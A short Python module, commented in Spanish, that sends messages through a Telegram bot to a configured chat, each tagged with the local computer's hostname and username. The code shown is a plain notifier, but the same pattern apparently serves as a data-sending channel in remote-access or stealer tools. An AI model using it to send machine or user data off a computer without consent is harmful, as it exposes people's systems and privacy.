import telebot
import m.config as config
import m.utils as utils

#Enviamos el mensaje al chatID del cliente
def send_message(mensaje):

    token = config.TL_APIKEY
    chat_id = config.chatID
    username = utils.get_Username()
    hostname = utils.get_computer_name()

    bot = telebot.TeleBot(token)

    bot.send_message(chat_id, f"[{hostname}] - USER: {username}> " + mensaje)